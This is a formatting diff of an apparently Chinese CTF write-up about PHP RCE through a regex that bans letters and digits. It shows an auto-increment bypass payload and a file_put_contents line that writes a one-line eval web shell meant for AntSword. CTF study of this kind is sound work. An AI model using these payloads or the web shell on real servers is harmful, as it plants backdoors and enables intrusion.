@@ -1,3 +1,5 @@
+#RCE
+
 ```php
 <?php
 header("Content-Type:text/html;charset=utf-8");
@@ -24,8 +26,8 @@ if (isset($_GET['wllm'])) {
 无字母数字 RCE
 而且此题不能 异或，取反，或
 可以自增
-#### 自增
 
+#### 自增
 
 ```url
 //测试发现7.0.12以上版本不可使用
@@ -36,12 +38,13 @@ $_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__+
 ```
 
 然后利用 file_put_contents() 写入马，蚁剑连接查看
+
 ```php
 _=file_put_contents("1.php","<?php @eval($_POST['shell']); ?>");
 \@
 ```
 
 参考
-[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_无数字正则匹配绕过取反脚本_yu22x的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/109143413)
+[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）\_无数字正则匹配绕过取反脚本\_yu22x 的博客-CSDN 博客](https://blog.csdn.net/miuzzx/article/details/109143413)
 
-[NSS日刷-[SWPUCTF 2021 新生赛]hardrce_3-open_basedir绕过 - Aninock - 博客园 (cnblogs.com)](https://www.cnblogs.com/aninock/p/16461151.html)
+[NSS 日刷-[SWPUCTF 2021 新生赛]hardrce_3-open_basedir 绕过 - Aninock - 博客园 (cnblogs.com)](https://www.cnblogs.com/aninock/p/16461151.html)
